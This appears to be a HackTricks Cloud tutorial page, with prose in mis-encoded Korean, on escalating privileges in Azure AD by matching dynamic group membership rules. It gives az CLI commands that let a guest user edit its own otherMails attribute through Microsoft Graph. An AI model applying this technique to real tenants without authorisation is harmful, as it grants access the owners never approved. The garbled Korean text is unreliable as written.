# Az - ë™ì  ê·¸ë£¹ ê¶Œí•œ ìƒìŠ¹

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## ê¸°ë³¸ ì •ë³´

**ë™ì  ê·¸ë£¹**ì€ ì„¤ì •ëœ **ê·œì¹™** ì§‘í•©ì´ ìˆëŠ” ê·¸ë£¹ìœ¼ë¡œ, ê·œì¹™ê³¼ ì¼ì¹˜í•˜ëŠ” ëª¨ë“  **ì‚¬ìš©ì ë˜ëŠ” ì¥ì¹˜**ê°€ ê·¸ë£¹ì— ì¶”ê°€ë©ë‹ˆë‹¤. ì‚¬ìš©ì ë˜ëŠ” ì¥ì¹˜ì˜ **ì†ì„±**ì´ **ë³€ê²½**ë  ë•Œë§ˆë‹¤ ë™ì  ê·œì¹™ì´ **ì¬í™•ì¸**ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  **ìƒˆ ê·œì¹™**ì´ **ìƒì„±**ë˜ë©´ ëª¨ë“  ì¥ì¹˜ì™€ ì‚¬ìš©ìê°€ **í™•ì¸**ë©ë‹ˆë‹¤.

ë™ì  ê·¸ë£¹ì—ëŠ” **Azure RBAC ì—­í• **ì´ í• ë‹¹ë  ìˆ˜ ìˆì§€ë§Œ, **AzureAD ì—­í• **ì„ ë™ì  ê·¸ë£¹ì— ì¶”ê°€í•˜ëŠ” ê²ƒì€ **ë¶ˆê°€ëŠ¥**í•©ë‹ˆë‹¤.

ì´ ê¸°ëŠ¥ì€ Azure AD í”„ë¦¬ë¯¸ì—„ P1 ë¼ì´ì„¼ìŠ¤ê°€ í•„ìš”í•©ë‹ˆë‹¤.

## ê¶Œí•œ ìƒìŠ¹

ê¸°ë³¸ì ìœ¼ë¡œ ëª¨ë“  ì‚¬ìš©ìê°€ Azure ADì—ì„œ ê²ŒìŠ¤íŠ¸ë¥¼ ì´ˆëŒ€í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ë™ì  ê·¸ë£¹ì˜ **ê·œì¹™**ì´ **ì†ì„±**ì— ë”°ë¼ ì‚¬ìš©ìì—ê²Œ **ê¶Œí•œ**ì„ ë¶€ì—¬í•˜ëŠ” ê²½ìš°, ì´ëŸ¬í•œ ì†ì„±ì„ ê°€ì§„ **ê²ŒìŠ¤íŠ¸**ë¥¼ **ìƒì„±**í•˜ì—¬ **ê¶Œí•œì„ ìƒìŠ¹**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²ŒìŠ¤íŠ¸ëŠ” ìì‹ ì˜ í”„ë¡œí•„ì„ ê´€ë¦¬í•˜ê³  ì´ëŸ¬í•œ ì†ì„±ì„ ë³€ê²½í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë™ì  ë©¤ë²„ì‹­ì„ í—ˆìš©í•˜ëŠ” ê·¸ë£¹ ê°€ì ¸ì˜¤ê¸°: **`az ad group list --query "[?contains(groupTypes, 'DynamicMembership')]" --output table`**

### ì˜ˆì‹œ

* **ê·œì¹™ ì˜ˆì‹œ**: `(user.otherMails -any (_ -contains "security")) -and (user.userType -eq "guest")`
* **ê·œì¹™ ì„¤ëª…**: 'security' ë¬¸ìì—´ì´ í¬í•¨ëœ ë³´ì¡° ì´ë©”ì¼ì„ ê°€ì§„ ëª¨ë“  ê²ŒìŠ¤íŠ¸ ì‚¬ìš©ìê°€ ê·¸ë£¹ì— ì¶”ê°€ë©ë‹ˆë‹¤.

ê²ŒìŠ¤íŠ¸ ì‚¬ìš©ì ì´ë©”ì¼ì— ëŒ€í•´ ì´ˆëŒ€ë¥¼ ìˆ˜ë½í•˜ê³  [https://entra.microsoft.com/#view/Microsoft\_AAD\_IAM/TenantOverview.ReactView](https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView)ì—ì„œ **í•´ë‹¹ ì‚¬ìš©ì**ì˜ í˜„ì¬ ì„¤ì •ì„ í™•ì¸í•˜ì„¸ìš”.\
ë¶ˆí–‰íˆë„ í˜ì´ì§€ì—ì„œ ì†ì„± ê°’ì„ ìˆ˜ì •í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ APIë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```powershell
# Login with the gust user
az login --allow-no-subscriptions

# Get user object ID
az ad signed-in-user show

# Update otherMails
az rest --method PATCH \
--url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
--headers 'Content-Type=application/json' \
--body '{"otherMails": ["newemail@example.com", "anotheremail@example.com"]}'

# Verify the update
az rest --method GET \
--url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
--query "otherMails"
```
{% endcode %}

## References

* [https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/](https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
